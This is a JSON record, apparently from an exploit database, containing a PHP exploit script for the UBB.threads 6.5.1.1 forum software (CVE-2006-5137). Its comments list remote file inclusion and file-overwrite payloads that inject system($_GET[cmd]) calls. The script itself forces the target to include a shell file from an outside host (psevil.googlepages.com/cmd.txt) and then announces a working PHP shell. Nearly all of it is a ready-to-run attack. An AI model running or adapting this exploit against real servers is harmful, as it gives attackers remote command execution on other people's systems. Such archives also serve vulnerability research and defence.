{
  "id": "2457",
  "title": "UBBCentral UBB.Threads 6.5.1.1 - &#039;doeditconfig.php&#039; Code Execution",
  "cve": "CVE-2006-5137",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\n// UBB.threads Multiple input validation error\r\n\r\n// Discovered By : HACKERS PAL\r\n// Copy rights : HACKERS PAL\r\n// Website : http://www.soqor.net\r\n// Email Address : security@soqor.net\r\n\r\n// Tested on Version 6 (6.5.1.1) and other versions maybe affected\r\n\r\n// Remote File including :\r\n// ubbt.inc.php?GLOBALS[thispath]=http://localhost/cmd.txt?&cmd=dir\r\n// ubbt.inc.php?GLOBALS[configdir]=http://localhost/cmd.txt?&cmd=dir\r\n// -------------------------------------------------------\r\n// Files overwrite vulnerabilities\r\n// if magic_qoutes_gpc = off\r\n\r\n// admin/doedittheme.php?theme[soqor]=\".system($_GET[cmd]).\"&thispath=../\r\n// and open includes/theme.inc.php?cmd=ls -la\r\n// or :-\r\n// admin/doeditconfig.php?config[soqor]=\".system($_GET[cmd]).\"&thispath=../\r\n// and open includes/config.inc.php?cmd=ls -la\r\n\r\n// -- # -- # -- # --\r\n\r\n// if magic_qoutes_gpc = on\r\n// admin/doeditconfig.php?thispath=../includes&config[path]=http://psevil.googlepages.com/cmd.txt?\r\n\r\n// and you will have a command execution files ..\r\n// example\r\n// dorateuser.php?cmd=ls -la\r\n// calendar.php?cmd=ls -la\r\n// and so many other files which includes using this variable ($config[path])\r\n// -------------------------------------------------------\r\n// Full path\r\n// cron/php/subscriptions.php\r\n// -------------------------------------------------------\r\n// Exploit :-\r\n\r\n/*\r\n/*   UBB.threads Multiple vulnerabilities\r\n/*  This exploit should allow you to execute commands\r\n/*            By : HACKERS PAL\r\n/*             WwW.SoQoR.NeT\r\n*/\r\nprint_r('\r\n/**********************************************/\r\n/*       UBB.threads Command Execution        */\r\n/*    by HACKERS PAL <security@soqor.net>     */\r\n/*         site: http://www.soqor.net         */');\r\nif ($argc<2) {\r\n\tprint_r('\r\n/* --                                         */\r\n/* Usage: php '.$argv[0].' host\r\n/* Example:                                   */\r\n/*    php '.$argv[0].' http://localhost/\r\n/**********************************************/\r\n');\r\n\tdie;\r\n}\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\n\r\n$url=$argv[1].\"/\";\r\n$exploit=\"admin/doeditconfig.php?thispath=../includes&config[path]=http://psevil.googlepages.com/cmd.txt?\";\r\n$page=$url.$exploit;\r\nFunction get_page($url)\r\n{\r\n\r\n\tif(function_exists(\"file_get_contents\"))\r\n\t{\r\n\r\n\t\t$contents = file_get_contents($url);\r\n\r\n\t}\r\n\telse\r\n\t{\r\n\t\t$fp=fopen(\"$url\",\"r\");\r\n\t\twhile($line=fread($fp,1024))\r\n\t\t{\r\n\t\t\t$contents=$contents.$line;\r\n\t\t}\r\n\r\n\t}\r\n\treturn $contents;\r\n}\r\n\r\n$page    = get_page($page);\r\n\r\n$newpage = get_page($url.\"calendar.php\");\r\n\r\nif(eregi(\"Cannot execute a blank command\",$newpage))\r\n{\r\n\tDie(\"\\n[+] Exploit Finished\\n[+] Go To : \".$url.\"calendar.php?cmd=ls -la\\n[+] You Got Your Own PHP Shell\\n/*        Visit us : WwW.SoQoR.NeT            */\\n/**********************************************/\");\r\n}\r\nElse\r\n{\r\n\tDie(\"\\n[-] Exploit Failed\\n/*        Visit us : WwW.SoQoR.NeT            */\\n/**********************************************/\");\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-09-29]",
  "url": "https://www.exploit-db.com/exploits/2457"
}